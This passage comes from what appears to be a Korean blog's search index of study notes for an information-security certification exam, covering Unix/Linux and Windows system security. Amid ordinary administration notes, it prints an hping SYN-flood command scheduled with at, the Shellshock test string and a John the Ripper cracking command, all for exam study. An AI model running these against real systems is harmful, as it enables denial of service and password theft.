입출력만 가능           Burst Mode 동작                       Block Multiplexer Channel                    Hybrid 모드           동시에 여러 I/O 처리 (블록 단위)                       Byte Multiplexer Channel                    한 개의 채널에 여러 개의 입출력 장치를 연결하여 시분할 공유하는 방식           저속 입출력 방식                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","시스템 보안","컴퓨터 구조"],
        "url": "https://bluesplatter.com/is_certification/ISCert-01System-02Computer/",
        "teaser": null
      },{
        "title": "01.시스템보안 - 03.유닉스&리눅스 서버 보안",
        "excerpt":"권한 설정   1. umask : 디폴트 권한     0022            666 - 022 : 644 (파일)       777 - 022 : 755 (디렉터리)           0077            666 - 077 : 600 (파일)       777 - 077 : 700 (디렉터리)           2. rwxrwxrwx : 소유자, 그룹, 다른 사용자     chmod 644 abc.txt            유저 : 읽기, 쓰기, 실행       그룹 : 읽기, 실행       Others : 읽기, 실행       chmod u+x, g+x, o-r abc.txt : 750           chown root:group abc.txt            abc.txt 의 owner 를 root 로 설정       abc.txt 의 group 을 group 로 설정           chgrp group abc.txt            abc.txt의 group을 group 로 설정           3. 특수 권한 관리     setuid : 4000, 실행 시에 소유자의 권한으로 실행            -rwsr-xr-x /usr/bin/passwd       일반 사용자가 패스워드 변경시 owner(root) 권한으로 /usr/bin/passwd 파일을 실행       chmod 4744 abc.txt       chmod u+s abc.txt       실행가능 파일 rws, 실행불가능 파일 rwS           setgid : 2000, 실행 시에 그룹의 권한으로 실행            -rwxr-sr-x       Mbox 의 경우 /var/mail 디렉터리의 소유자는 root, 그룹은 mail, setgid       일반 사용자는 메일 계정을 생성할 때 mail 디렉터리에 자신의 디렉터리를 생성하고 메일을 보관할 수 있게 됨           sticky bit : 1000, /tmp, 임시 디렉터리            공용 디렉터리를 만들어 누구나 자유롭게 사용할 수 있도록 함       해당 디렉터리의 삭제는 소유자, root만 가능       drwxrwxrwt tmp           검색법            find / -perm -4000 -print 2&gt;/dev/null       find / -perm -2000 -print 2&gt;/dev/null       find / -perm -1000 -print 2&gt;/dev/null                    2&gt;/dev/null : 에러, /dev/null 에 버리기 (1은 표준출력)           - : 해당 권한을 포함한 모든 권한           ` ` : 정확히 일치하는 권한                           계정 정보   1. /etc/passwd     해시로 암호화된 패스워드   /etc/shadow -&gt; /etc/passwd : pwunconv   root: x: 0: 0: root: /root: /bin/bash            Login Name       Password : x -&gt; /etc/shadow       User ID : root = 0       User Group ID : root = 0       Comments       Home Directory       Shell : 만약 /bin/false 이면 셸을 실행하지 않음.           2. /etc/shadow     /etc/passwd -&gt; /etc/shadow : pwconv   root: $1$Fz4q1GjE$G/: 14806: 0: 99999: 7: : :             Login Name       Encrypted : password       Last Changed : 1970년 1월 1일 부터 일수 계산       Minimum : 패스워드 변경 전 최소 사용기간 (일 수)       Maximum : 패스워드 변경 전 최대 사용기간 (일 수)       Warn : 패스워드 사용 만기일 전에 경고 메시지를 제공하는 일 수       Inactive : 로그인 접속차단 일 수       Expire : 로그인 사용을 금지하는 일 수(월/일/연도)       Reserved : 사용하지 않음       chage -l &lt;사용자명&gt; : 패스워드 만료날짜 확인           3. /usr/bin/passwd     -rwsr-xr-x : setuid &gt; 실행시 소유자의 권한으로 실행   passwd, passwd &lt;사용자명&gt;   4. John the ripper     john --format=raw-MD5 /root/passwd.txt --crack-status   Cracking : 패스워드를 알아내기 위한 공격            John the ripper       L0phtcrack       pwdump       hydra           어떤 입력 값 X 에 대해 암호문 Y가 나오는 것을 알고 있을 때, 입력 값과 암호문을 파일에 저장하고 계속 입력해보면서 패스워드를 알아냄   5.  /etc/motd     로그인 시에 출력하는 배너 정보 -&gt; 확인필요   로그 파일 (책임 추적성) 및 주요 명령어 사용   1. 로그파일     WORM(Write Once Read Many) Storage : 한번만 기록하고 그 뒤로 읽기만 가능            로그파일 삭제,변조 불가 / 고비용           utmp : 현재 사용자 정보를 가진 로그파일            /var/run/utmp       w, who : 현재 사용자 정보를 utmp 파일을 읽어 출력           btmp : 로그인 실패 정보            /var/log/btmp       lastb : 해당 파일은 바이너리로 되어있기 때문에 lastb 로 확인           wtmp : 로그인과 로그아웃 정보를 가진 로그파일            로그인/로그아웃 정보, 시스템 종료(shutdown) 및 부팅(booting) 정보, 재부팅(reboot) 정보, telnet/ftp 로그인 정보       /var/log/wtmp       last : 로그인, 로그아웃 정보를 wtmp 파일을 읽어 출력       last reboot | more : 재부팅 시간 정보 확인하기           lastlog : 마지막 로그인   secure : 원격 접속 정보   syslog : 로그를 남기는 프로그램            /var/log/ 디렉터리에 로그가 기록됨       syslogd 에 의해 로그가 기록됨.       /etc/syslogd.conf 파일을 읽어 로그 기록 수준을 결정함       syslog 주체별(Facility) 분류                    kern : kernel 에서 요청하는 경우           mail : mail subsystem 에서 요청하는 경우           lpr : printing subsystem 에서 요청하는 경우           daemon : system server processes 에서 요청하는 경우           auth : login authentication system 에서 요청하는 경우                       emerg &gt; alert &gt; crit &gt; err &gt; warn &gt; notice &gt; info &gt; debug                    kern.* : 커널 수준의 모든 로그를 기록하라.           mail.err : 메일에서 발생하는 err 수준의 로그를 기록하라.                           xferlog : ftp 사용 정보   sulog : su 명령로그   2. 명령어 관련     cron : 작업 스케줄 관리            일정한 날짜와 시간에 지정된 작업을 실행하는 프로세스       /etc/crontab 에 설정된 것을 읽어서 작업을 수행       분 시 일 월 요일(0~6/일~토) 사용자 실행명령                    30 3 * * 2 root /home/clean.sh : 매주 화요일 3시 30분에 /home/clean.sh 명령을 실행           */10 2-5 * * * root /home/user/abc : 매일 2-5시 까지 10분마다 실행           0 7 1 1-10/2 * /bin/vipcheck.sh : 1-10월 두 달 주기로 1일 7시에 실행                       crontab 옵션                    -l : 현재 로그인 된 계정에 잡혀있는 작업 스케줄 확인           -e : 현재 로그인 중인 계정에 작업을 등록           -r : 현재 crontab에 등록된 작업을 삭제           -u &lt;USER명&gt; : 작업을 실행시킬 유저명 설정           주의사항 : crontab 명령 실행 시 현재 입력되는 내용으로 덮어씀.                           at : 예약한 명령어를 정해진 시간에 한 번만 실행            at 18:00                    hping --rand-source 127.0.0.1 -p 80 -S -flood &gt; log.txt           18시에 TCP Syn DDos 공격을 하고 그 로그를 log.txt에 저장                       at 옵션                    -l : 현재 실행 대기 중인 명령의 목록을 출력           -r : 실행 대기 중인 명령에서 해당 작업번호를 삭제           -f : 표준 입력 대신 실행할 명령을 파일로 지정                           리다이렉션            &gt; : 결과를 파일로 저장       &gt;&gt; : 해당 파일에 결과를 추가           파이프            명령어1 | 명령어2 : 명령어 1의 결과를 명령어 2의 입력으로 전달           find            find /var/www -name \"[a-z][a-z][0-9]* : var/www 의 웹디렉터리에서 첫 번째 글자와 두 번째 글자는 영문자 소문자이고 세 번째 글자는 숫자로 되어있는 파일 찾기       find . -name \"* *\" -exec rm -f { }\\; : 현재 디렉터리에서 파일 이름에 공백이 들어간 모든 파일을 삭제       find / -perm +6000 2&gt;/dev/null : setuid, setgid 중 하나라도 부여된 것을 찾음       find / - mtime -1 : 24시간 동안 변경된 파일 찾기                    -atime : access time 으로 파일을 열거나 접근한 시간을 기준           -mtime : modify time 으로 파일이 변경된 시간을 기준           -ctime : change time 으로 파일속성이 변경된 시간을 기준                       find / -nouser -o -nogroup : 소유자가 없거나 그룹이 없는 파일           파일 무결성 검사            파일 시간은 얼마든지 변조가 가능       해시 값을 사용해서 파일의 무결성 검사 : tripwire                    tripwire --init : 해시 값을 저장한 데이터베이스를 초기화           tripwire --check : 무결성 검사를 실행                           Run Level (부팅 단계)   1. Loader     보조기억장치에 있는 운영체제의 커널을 주기억장치에 올리는 작업   LILO (Linux Loader)   GRUB            /boot/grub/grub.conf                                      설정 값           설명                                           default=0           부트 순서를 지정하는 번호로 멀티부트의 경우 운영체제 레이블 번호를 선택                             timeout=0           지정된 시간이 경과되면 default로 지정된 운영체제로 부팅                             splashimg=(hd0,0) /grub/splash.xpm.gz           부팅 이미지를 지정하는 부분                             hiddenmenu           부트로더를 보여주지 않음                             title Fedora           부팅되는 부트 엔트리를 의미                                  부트정보를 사용자가 임의로 변경할 수 있음       여러 운영체제를 사용할 수 있는 멀티부팅 지원       커널 경로 및 파일명만 알고 있다면 부팅이 가능함           2. 리눅스 Booting 순서     전원을 켜면 ROM BIOS를 읽고 디스크의 MBR(Master Boot Record)에 있는 부트로더(Boot Loader)가 실행된다.   부트로더는 보조장치에 저장되어 있는 리눅스 커널을 찾고 실행한다.   리눅스 커널은 하드웨어를 확인하고 root의 읽기전용으로 마운트를 수행한다.   디스크를 검사하고 root의 쓰기전용으로 다시 마운트를 수행한다.   리눅스 커널은 init 프로세스를 실행하고 PID 1번을 할당한다. init 프로세스는 자신의 설정파일인 /etc/initab 파일을 읽어서 디바이스 및 프로세스를 활성화 한다. init 프로세스의 작업 수행은 리눅스의 Run 레벨에 따라 다르게 부팅한다.   3. Run Level          init [Run Level]                                  실행단계           내용                                           0           PROM 감사 단계                             1           ⦁ 관리상태 단계. 사용자 로그인의 접근이 불가능한 단일 사용자 단계. 여러 개의 파일 시스템이 로드되어 있음. ⦁ 암호를 변경할 때 사용                             2           공유 자원을 갖지 않은 다중 사용자 단계                             3           기본 실행단계로 자원을 가진 다중 사용자 단계, 텍스트 유저모드                             4           현재 사용되지 않음                             5           Run Level 3로 기동 후에 그래픽 모드인 X-Windows 를 실행                             6           재부팅 단계로 실행단계 3의 상태로 재부팅                           4. 3.20 사이버테러     2013년 3월 20일 방송국과 금융사를 대상으로 전산망을 마비시킨 사건   악성코드는 kbs.exe, imbc.exe, sbs.exe 등 형태로 배포   윈도우 계열 : MBR(Master Boot Record), VBR(Volume Boot Record)삭제   리눅스(유닉스) : dd 및 rm 명령을 원격 전송해 디스크를 삭제   리눅스 방화벽   1. iptables     리눅스에서 특정 패킷을 분석해 패킷을 차단하거나 허용할 수 있다.   패킷 필터링 정책            모든 것을 허용한 후에 일부 패킷을 제한한다.       모든 것을 거부한 후에 일부 패킷을 허용한다.       패킷 필터링 chain 종류                    INPUT : 외부에서 방화벽 서버로 들어오는 패킷 제어           FORWARD : 외부 패킷이 방화벽을 통과해 다른 네트워크로 가는 것 제어           OUTPUT : 방화벽에서 외부로 나가는 패킷 제어                           사용법            -A : --append : 규칙을 추가한다.       -N : --new-chain : 새로운 체인 생성       -X : --delete-chain : 체인 제거       -P : --policy : 체인 기본정책 변경       -L : --list : 체인의 규칙상태 보기       -F : --flush : 체인 내의 모든 규칙 제거 (방화벽 초기화)       -Z : --zero : 체인내의 모든 규칙의 패킷과 바이트의 카운트를 0으로 초기화       -D : --delete : 규칙을 삭제       -R : --replace : 새로운 규칙으로 대체       -I : --insert : 체인 가장 처음에 규칙을 추가       -E : --rename-chain : 체인의 이름을 변경           ifconfig            네트워크의 인터페이스 정보를 확인하거나 시작, 종료할 수 있다.       eth0       lo : Loopback 주소 (127.0.0.1)                    iptables -A OUTPUT -o lo -j DROP : 루프백 차단                           iptables -L : 등록된 접근 제어를 확인   iptables -A INPUT -s 192.168.0.3 -j DROP : 특정 소스 차단   iptables -A FORWARD -p udp -m udp --dport 53 -j DROP : DNS 차단   유닉스 구조   1. 파일 시스템 구조                  구성 항목       세부 내용                       VTOC 디스크 레이블       각 파티션의 기본 정보                 부트블록       부트스트랩에 필요한 파일들                 프라이머리 슈퍼블록       데이터 블록의 개수, 실린더 그룹의 개수, 마운트 정보                 백업 슈퍼블록       각 실린더마다 슈퍼블록에 대한 복사본을 가짐                 실린더 그룹       슈퍼블록, 실린더 그룹 블록, i-node 테이블, 데이터 블록을 포함                 슈퍼블록       파일 시스템 크기, i-node 테이블의 크기, 빈 블록 리스트 등 파일 시스템 관리 정보                 실린더 그룹 블록       실린더 그룹 내의 유효 블록들의 비트맵 정보나 통계 정보                 i-node 테이블       파일에 대한 중요한 정보, 파일 크기, 위치, 유형, 사용 허가권, 날짜 정보                 데이터 블록       실제 데이터가 저장되는 공간           1. 리눅스 파일 시스템 구조     부트 블록 (Boot Block)            파일 시스템으로부터 리눅스 커널을 적재시키기 위한 프로그램           슈퍼 블록 (Super Block)            파일 시스템의 크기, 블록 수 등 이용 가능한 빈 블록 리스트(list)       빈 블록 리스트에서 그 다음의 빈 블록을 가리키는 인덱스       inode 목록의 크기, 파일 시스템에 있는 빈 inode의 수와 목록       빈 inode 목록에서 그 다음의 빈 inode의 수와 목록       슈퍼 블록들이 수정되었는지 나타내는 플래그       파일 시스템 이름과 파일 시스템 디스크의 이름           아이노드(inode)            파일이나 디렉터리에 대한 모든 정보를 가지고 있는 구조           데이터 블록(Data block)            실제 데이터가 저장되어 있는 파일 형태           2. 아이노드(inode)     inode Number : 유일한 일련번호 값, 파일 관리를 위함   inode 가 가진 정보            파일 소유자의 사용자 ID       파일 소유자의 그룹 ID       파일 크기       파일이 생성된 시간       최근 파일이 사용된 시간       최근 파일이 변경된 시간       파일이 링크된 수       접근모드 (퍼미션)       데이터 블록 주소           inode 의 기능            할당 및 적용 : 파일 구성 블록에 대한 물리적 위치 정보       파일생성 : 파일이 생성되면 해당하는 inode 가 i-list에 만들어지며 그 inode 의 inode Number와 파일 이름, 디렉터리가 등록됨.       파일링크 : 기존 파일과 링크할 경우 디렉터리에 그 파일에 대한 새로운 이름이 등록되고 inode Number는 본래 있던 파일의 inode Number 가 복사됨       파일삭제 : 파일에 대한 inode 의 파일 링크 수가 하나 감소되고 디렉터리 엔트리(Directory Entry) 에서 해당 파일의 inode Number 가 0으로 변경됨              이미지 출처      심볼릭 링크 :            링크정보만 가진 새 inode 가 만들어지고 inode는 원래 파일의 포인터(주소)정보만을 가짐.       원본 파일 삭제시 삭제됨.       ln -s 대상파일 심볼릭링크           하드 링크 :            원본 파일을 복사해서 동일한 inode를 만듦.       원본 파일을 삭제하거나 이동해도 하드링크는 존재       ln 대상파일 하드링크       원본 파일과 링크 정보는 다른 개념으로 하드 링크 시 원본파일은 하나만 존재.           ls -il 로 inode number 를 확인할 수 있음.   2. 파일 시스템 종류     Ext(Extended File System)            최대 2GB       255byte 파일명       접근제어, inode 수정, 타임스템프 수정 등의 기능이 불가       사용할 수록 단편화가 심해짐           Ext2(Second Extended File System)            파일 시스템은 2GB까지, 볼륨 크기는 32TB까지 지원, 서브 디렉터리 개수 제한이 대폭 증가(32768개)       FSCK를 사용한 파일 시스템 오류 수정을 지원       캐시의 데이터를 디스크에 저장 중 오류 발생 시 파일 시스템에 손상이 올 수 있다. (Sync 이전 데이터 손실)       FSCK 이용한 파일 복구 시간에 많은 시간이 소요됨(전체 섹터 검사)           Ext3(Third Extended File System)            EXT2에 저널링 기능 추가 및 온라인 파일 시스템이 증대       파일 시스템 변경 시 저널에 먼저 수정 내용을 기록함(갑작스런 다운 시 빠르게 오류 복구)       온라인 조각 모음이 불필요(장시간 사용 시 조각화 발생)       디스크 조각화를 최소화           Ext4(Fourth Extended File System)            16TB까지 파일 시스템을 지원, 볼륨은 1엑사바이트까지 지원       Block Mapping 방식 및 Extends 방식을 지원       저널 Checksum 기능이 추가되어 안전성 강화       하위 호환성 지원 : ext3, ext2와 호환       Delayed allocation : 디스크에 쓰이기 전까지 블록 할당을 미루는 기술로 조각화 방지에 효과적       온라인 조각 모음 : 조각화 방지를 위한 커널 레벨의 기술       Persistent pre-allocation : 파일 전체만큼의 공간을 사전 할당. 스트리밍, 데이터베이스 등에 유용           3. 운영체제 핵심 구성요소                  구성요소       내용                       커널(Kernel)       ⦁ 주기억장치(Main Memory)에 상주하면서 사용자 프로그램을 관리하는 운영체제의 핵심 역할 ⦁ 커널은 프로세스, 메모리, 입출력(I/O), 파일 관리 등을 수행                 셸(Shell)       ⦁ 명령어 해석기/번역기로 사용자 명령의 입출력을 수행하며 프로그램을 실행 ⦁ 셸의 종류에는 Bourne 셸, C 셸, Korn 셸 등이 있고 리눅스 표준 셸 인 bash 셸이 있음                 파일 시스템(File System)       여러 가지 정보를 저장하는 기본적인 구조이며, 시스템 관리를 위한 기본 환경을 제공하고, 계층적인 트리 구조 형태(디렉터리, 서브 디렉터리, 파일)           4. bash 셸 환경 설정                  전역 설정파일       설명                       .bash_profile       ⦁ 사용자 홈 디렉터리에 있는 파일 ⦁ 개별적인 셸 환경을 설정                 .bashrc       사용자 정의 변수, 함수 alias 를 정의                 .bash_logout       사용자가 로그아웃할 때 실행되는 파일을 정의              /etc : 리눅스를 사용하는 모든 사용자에게 적용되는 환경파일   Home Directory : 사용자별 설정파일   셸 환경변수            env : 현재 환경에 설정되어 있는 모든 변수를 확인할 수 있음       echo $[환경변수명] : 환경변수명에 해당하는 변수값을 확인                                      환경변수           설명                                           SHELL           사용자의 로그인 셸의 절대경로                             HOME           홈 디렉터리에 대한 경로 이름                             PATH           실행할 명령어를 찾을 경로                             USER           사용자 이름                             LOGNAME           로그인할 때 사용할 이름                             TERM           사용 중인 단말기를 설명                             MAIL           전자메일 우편함                             HOSTNAME           호스트 명을 의미                             TMOUT           이 시간동안 명령 등의 입력이 없으면 연결이 종료됨                           Shell Shock            악의적 명령실행, 관리자 권한 획득 등       리눅스 환경변수에 빈 함수를 넣으면 그 뒤에 오는 코드는 무조건 실행됨       env x='(){ :;}; echo vulnerable' bash -c \"echo print this\"           5. 리눅스 디렉터리 구조                  디렉터리 구조       설명                       /       루트 디렉터리                 /bin       기본적인 실행 명령                 /boot       LILO 등 부팅에 관련된 파일                 /dev       장치 파일 모음                 /etc       시스템 설정 파일                 /home       사용자 홈 디렉터리                 /lib       C 라이브러리                 /mnt       임시 마운트용 디렉터리                 /proc       시스템 정보를 가진 가상 디렉터리                 /root       루트 사용자의 홈 디렉터리                 /sbin       시스템 관리용 실행파일                 /tmp       임시파일 디렉터리                 /usr       애플리케이션이 설치되는 디렉터리                 /var       시스템에서 운영되는 임시파일 및 로그파일                          usr 디렉터리 구조       설명                       /usr/X11       Link                 /usr/bin       Common Programs                 /usr/doc       Documentation                 /usr/etc       Configuration files                 /usr/lib       Shared libraries                 /usr/local       Other applications                 /usr/man       Man page                 /usr/sbin       System administration programs                 /usr/share       Shared information                 /usr/src       Source code                          Device 파일 시스템       설명                       /dev/fd       플로피 디스크                 /dev/hda       마스트 IDE 하드 디스크                 /dev/sda       SCSI 및 SATA 하드 디스크                 /dev/cdrom       CD ROM 드라이버                 /dev/mouse       마우스                 /dev/hdb       슬레이브 IDE 하드 디스크                 /dev/hd       하드 디스크                          proc 파일 시스템       설명                       /proc/buddyinfo       버디 할당자 정보                 /proc/cmdline       시스템 부팅 중 커널에 제출된 명령 내용                 /proc/cpuinfo       시스템 cpu 정보                 /proc/devices       디바이스들의 목록                 /proc/diskstats       디스크의 상태 및 파티션 정보                 /proc/dma       DMA 채널                 /proc/filesystems       파일 시스템의 목록                 /proc/interrupts       인터럽트에 대한 통계                 /proc/iomem       할당된 메모리 영역                 /proc/ioport       입출력 포트 정보                 /proc/kallsyms       심볼들의 목록                 /proc/loadavg       CPU 부하와 관련된 정보                 /proc/locks       잠금 파일                 /proc/mdstat       RAID 시스템의 정보를 제공                 /proc/meminfo       시스템 메모리 정보                 /proc/modules       사용중인 모듈들                 /proc/partitions       파티션 정보                 /proc/slabinfo       슬랩 할당기 통계 정보                 /proc/swaps       스왑 파티션에 대한 정보                 /proc/uptime       시스템이 부팅된 이후의 시간          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","시스템 보안","유닉스 서버 보안","리눅스 서버 보안"],
        "url": "https://bluesplatter.com/is_certification/ISCert-01System-03Unix/",
        "teaser": null
      },{
        "title": "01.시스템보안 - 04.윈도우 클라이언트 및 서버 보안",
        "excerpt":"윈도우 아키텍처     (Ring 구조) - 경량화된 운영체제, Plug In Play   하드웨어 / HAL / 마이크로 커널 / 각종 관리자 / 응용 프로그램    이미지 출처                  구성 내용       세부 내용                       HAL (Hardware Abstraction Layer)       드라이버 개발자가 HAL 표준을 준수하면 하드웨어-시스템 간 원할한 통신 가능                 Micro Kernel       Manager 에게 작업을 분담시키고 하드웨어를 제어                 IO Manager       시스템 입출력을 제어, 장치 드라이버 사이에서 메시지를 전달, 응용 프로그램이 하드웨어와 통신할 수 있는 통로를 제공                 Object Manager       파일, 포트, 프로세스, 스레드와 같은 각 객체에 대한 정보를 제공                 Security Reference Manager       데이터 및 시스템 자원의 제어를 허가/거부 함으로써 시스템의 보안설정을 책임짐                 Process Manager       프로세스 및 스레드를 생성하고 요청에 따른 작업 처리                 Local Procedure Call       프로세스는 서로의 메모리 공간을 침범하지 못하기 때문에 프로세스 간에 통신이 필요한 경우 이를 처리하는 장치                 Virtual Memory Manager       응용 프로그램의 요청에 따라 RAM 메모리 할당, 가상 메모리의 Paging을 제어                 Win32/64 Sub System       윈도우의 기본 서버 시스템, 32비트 및 64비트 응용 프로그램이 동작할 수 있도록 지원                 POSIX       유닉스 운영체계에 기반을 두고 있는 일련의 표준 운영체계 인터페이스                 Security Sub System       사용자가 로그인할 때 데이터를 보호하고 운영체제가 이를 제어할 수 있도록 만든 서브 시스템           윈도우 파일시스템   1. FAT16 (File Allocation Table)     최대 디스크 2GB 지원   암호화 및 압축이 불가능(접근 제어 불가)   파일명 최대 길이는 영문 8자   클러스터당 1632KB 할당, 내부단편화 발생   2. FAT32     최대 디스크 2TB 지원 (대용량 디스크 지원)   암호화 및 압축이 불가능(접근 제어 불가)   파티션 지원   파일명 최대 길이는 영문 256자   클러스터당 4KB 할당, 내부단편화를 줄임   3. NTFS     암호화(Encrypting File System:대칭키 기법) 및 압축 지원, 대용량 파일 시스템 지원   가변 클러스터 크기(512 ~ 64KB), 기본 값은 4KB   트랜잭션 로깅을 통한 복구/오류 수정이 가능   Windows NT 이상에서 지원   USN 저널            Update Sequence Number Journal       저널링 기능 제공 (파일 시스템이 변경될 때 그 내용을 기록)       롤백가능           ADS(Alternate Data Stream) : MAC 파일 시스템과 호환성을 위해 만든 공간   Quotas : 사용자별 디스크 사용량 제한   EFS            Encrypting File System       대칭키 기법으로 파일 데이터를 암호화함           대용량 지원 (2TB 이상)            Volume Boot Record       Master File Table       Data Area           NTFS 파일 시스템            VBR(Volume Boot Record) : 부트섹터, 부트코드, NTLDR 위치 정보       MFT(Master File Table) : NTFS의 메타정보, 파일 및 디렉터리 정보, 파일위치, 속성, 시간정보, 파일명, 크기 등의 정보       Data Area           Convert 로 FAT 에서 NTFS로 파일 시스템 변경            CONVERT D: /FS:NTFS           4. 윈도우 파일시스템 구성      마스터 부트 레코드   부트 레코드   FAT1 파일 위치 정보   FAT2 FAT1의 복사본   루트 폴더   윈도우 프로세스 구조 (Message Driven)      키보드에서 발생시킨 이벤트를 윈도우 시스템에 전송하고 윈도우 시스템은 메시지 큐에 저장한 후 각 윈도우 별 핸들을 식별 후 해당 윈도우를 호출한다.            이벤트 발생 (입력장치)       이벤트 감지 (윈도우 시스템)       이벤트 전송 (메시지 큐)       메시지 추출       메시지 전송 (WinMain)       메시지 처리 (WinProc), 화면에 출력           윈도우 인증    이미지 출처      Winlogon : 로그인 프로세스            GINA(msgina.dll) : 계정정보와 암호화 된 패스워드를 LSA에 전달           LSA(lsas.exe) : 계정 검증, 감사 기록            계정과 암호를 검증하기 위해서 NTLM(암호화)모듈을 로딩하고 계정을 검증       SRM 이 작성한 감사로그를 기록           SAM            사용자 계정정보(해시 값) 에 저장       리눅스의 /etc/shadow 파일과 같은 역할을 수행           SRM(Security Reference Monitor) : 사용자 별 고유 SID 부여 및 권한 부여        윈도우 운영체제 관련 프로세스 세부 내역                                  프로세스           설명                                           wininit.exe           윈도우 시작 프로그램                             services.exe           윈도우 서비스를 관리                             lsm.exe           ⦁ Local Session Manager ⦁ 시스템 관리 작업, 주요 함수 실행, 호스트 컴퓨터와 서버의 연결을 관리                             lsass.exe           ⦁ LSASS(Local Security Authority Subsystem Service) ⦁ 사용자 로그인 검사, 비밀번호 변경관리, 액세스 토큰을 생성 ⦁ Windows Security Log를 작성                             svchost.exe           서비스를 관리하기 위한 프로세스                             conhost.exe           키보드, 마우스 입력 허용, 문자 출력, 콘솔 API 등 셸의 기본 기능을 수행                             csrss.exe           윈도우 콘솔을 관리하면서 신규 스레드를 생성하거나 삭제하는 역할을 수행                             taskmgr.exe           윈도우 시스템 내에서 실행되는 프로세스 정보를 제공                             mstsc.exe           원격으로 데스크톱(Desktop)을 실행하는 경우 사용                           윈도우 실행파일 PE(Portable Execute)     PE : 윈도우 실행파일(*.exe) 의 포맷을 의미   .text : 코드를 저장   .data : 문자열 및 전역변수가 저장   .Idata : Import 된 함수   .edata : Export 함수 정보   .rsrc : 이미지, 아이콘과 같은 자원 정보   imageBase : PE 파일이 메모리에 로딩되는 시작주소   윈도우 로그 (책임 추적성)     로그 종류 : 응용 프로그램 로그, 보안 로그, 시스템 로그   1. 윈도우 이벤트 로그 (Event Log)     윈도우 시스템을 사용하는 동안 발생되는 모든 내용을 기록하는 로그파일   *.evt : 이벤트 뷰어라는 관리도구를 사용하여 확인   일정 크기가 되면 덮어씀        윈도우 로그 유형                                  윈도우 로그 유형           내용                                           응용 프로그램 로그           프로그램 개발자에 의해서 이벤트를 정의하고 분류하여 응용 프로그램에 기록할 이벤트들이 수록된 자료                             보안 로그           ⦁ 관리자에 의해서 보안 로그에 기록된 이벤트 유형을 지정하고, 보안로그에 기록됨. ⦁ 로그온 횟수, 로그인 오류 정보, 파일 생성 및 다른 개체 만들기, 파일 열기 및 삭제 등의 리소스 사용관련 이벤트 기록                             시스템 로그           윈도우 시스템에서 사전에 정한 윈도우 시스템 구성요소에서 기록한 이벤트 자료                           2. 웹 아티팩트 분석          분석 대상                                  분석대상           설명                                           웹브라우저 캐시           다운로드 받은 이미지 텍스트 파일, 아이콘 등이 있음                             히스토리 분석           웹 사이트 접속정보를 저장하는 것으로 월별, 일별 방문 기록을 가지고 있음                             쿠키정보           호스트 정보, 경로, 수정시간, 만료시간 등의 값이 있음                                인터넷 익스플로러에 대한 아티팩트 수집 데이터             index.dat –&gt; WebCacheV01.dat 혹은 WebCacheV24.dat       캐시, 히스토리, 쿠키 등의 정보가 각각 나누어져 별도의 index.dat 파일로 구성 –&gt; 웹 아티팩트 파일이 통합되어서 관리됨.           윈도우 계정   1. 내장된 계정     Users : 기본적인 권한이 없고 Domain Users 그룹 구성원   Account Operators : 서버 관리자, 도메인 추가, 그룹 생성, 삭제 등   Print Operators : 도메인 컨트롤러에 프린터를 생성   Server Operators : 도메인 컨트롤러의 자원의 공유, 폴더 백업 및 복구   2. 유니버설 그룹 (MAC 별 권한 관리)     복수의 도메인 환경에서 상호 관련되어 있는 자원에 대한 허가를 부여할 때 사용                  구분       설명                       Administrator       ⦁ 해당 컴퓨터의 모든관리 권한과 사용 권한을 가짐 ⦁ 기본적으로 Administrator가 사용자 계정과 Domain Admins를 포함                 Users       ⦁ 기본적이 권한은 갖지 않음 ⦁ 컴퓨터에서 생성되는 로컬 사용자 계정 포함 ⦁ Domain Users 글로벌 그룹이 구성원으로 포함                 Guests       관리자에 의해 허락된 자원과 권한만을 사용하여 네트워크 자원에 접근 가능                 Backup Operators       Windows 백업을 이용하여 모든 도메인의 컨트롤러에 있는 파일과 폴더를 백업하고 복구할 수 있는 권한이 있음                 Power Users       ⦁ 컴퓨터에서 로컬 사용자 계정을 생성하고 수정할 수 있는 권한을 갖고 있으며 자원을 공유하거나 멈출 수 있음 ⦁ 시스템에 대한 전체 권한은 없지만 시스템을 관리할 수 있는 권한이 부여된 그룹           윈도우 디렉터리                  구성 내용       세부 내용                       System32       윈도우 기본 서버 시스템, 32비트 및 64비트 응용프로그램이 동작할 수 있도록 지원                 System32\\Config       윈도우 레지스트리 파일이 저장                 System32\\DllCache       윈도우 시스템 폴더를 백업해 놓은 폴더, 복원시 사용                 System32\\drivers\\etc       hosts 파일이 존재하며 특정 사이트 인터넷 접속을 차단                 Repair       마지막으로 성공한 구성으로 부팅할 때 사용하는 레지스트리 정보가 저장됨                 Media       윈도우 웨이브 파일과 미디어 파일이 들어 있는 폴더(경고음 등)           공유 폴더      net share : 공유폴더 목록 확인   net share &lt;폴더 이름&gt; /delete : 공유 폴더 삭제   IPC$ : 프로세스 간 통신. 네트워크 서버원격 관리 용도로 사용   포트스캐닝 : nmap -O -v &lt;IP&gt; : 운영체제 식별, 상세히 출력            윈도우의 SMB를 사용하여 윈도우 버전을 식별                    Server Message Block : 네트워크 상 존재하는 노드들 간에 자원을 공유할 수 있도록 설계된 프로토콜           취약점 공격 가능                       취약 포트 (예:445 - MS 파일 및 프린터 공유 프로그램 서비스)                    NetBIOS over TCP/IP 기능을 사용해서 공유 폴더에 파일을 복사하거나 삭제하는 등의 공격을 수행할 수 있음           패스워드 Cracking                           레지스트리   1. 레지스트리     운영체제 및 응용 프로그램 등에 필요한 정보를 저장/관리 하기 위한 계층형 데이터베이스   Key(식별자), Value(이름), Data Type(종류), Data(데이터) 로 이루어져 있음        regedit.exe 로 관리                                  루트 키(Root Key)           설명                                           HKEY_CLASS_ROOT           파일의 각 확장자에 대한 정보와 파일과 프로그램 간의 연결에 대한 정보                             HKEY_LOCAL_MACHINE           설치된 하드웨어와 소프트웨어 설치 드라이버 설정에 대한 정보                             HKEY_USERS           사용자에 대한 정보                             HKEY_CURRENT_CONFIG           디스플레이 설정과 프린트 설정에 관한 정보                           2. 하이브(Hive) 파일     c:\\windows\\system32\\config 에 위치   레지스트리 정보를 가지고 있는 물리적인 파일   regedit.ext : 하이브 파일을 읽어서 보여주거나 변경하는 프로그램   일반적인 에디터로 변경 불가능, 커널에 의해서 관리        하이브 셋 (파일) :                                  하이브 파일           설명                                           SYSTEM           시스템 부팅에 필요한 시스템 전역 구성정보                             SOFTWARE           시스템 부팅에 필요없는 시스템 전역 구성정보, 소프트웨어 정보                             SECURITY           시스템 보안정책과 권한 할당 정보, 시스템 계정만 접근 가능                             SAM           로컬 계정 정보와 그룹 정보, 시스템 